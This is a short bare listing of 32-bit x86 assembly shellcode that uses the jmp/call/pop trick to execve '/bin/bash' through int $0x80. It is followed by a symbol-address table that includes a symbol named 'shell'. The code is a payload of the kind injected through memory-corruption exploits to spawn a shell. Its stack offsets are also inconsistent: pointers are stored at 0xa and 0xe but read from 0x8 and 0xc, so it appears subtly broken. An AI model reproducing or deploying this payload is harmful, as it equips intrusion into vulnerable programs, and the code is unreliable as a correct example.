.text
.global _start
_start:
  jmp line
  address:
    pop %esi
    xorl %eax, %eax
    movb %al, 0x9(%esi)
    movl %esi , 0xa(%esi)
    movl %eax , 0xe(%esi)
    movb $11 , %al
    movl %esi, %ebx
    leal 0x8(%esi), %ecx
    leal 0xc(%esi), %edx
    int $0x80
  
  line:
    call address
    variable:
      .ascii "/bin/bash"
  



0x0804bf14  _DYNAMIC
0x0804c000  _GLOBAL_OFFSET_TABLE_
0x0804c020  __data_start
0x0804c020  data_start
0x0804c024  __dso_handle
0x0804c000  shell
0x0804c06c  __TMC_END__
0x0804c06c  __bss_start
0x0804c06c  _edata
0x0804c06c  completed
0x0804c070  _end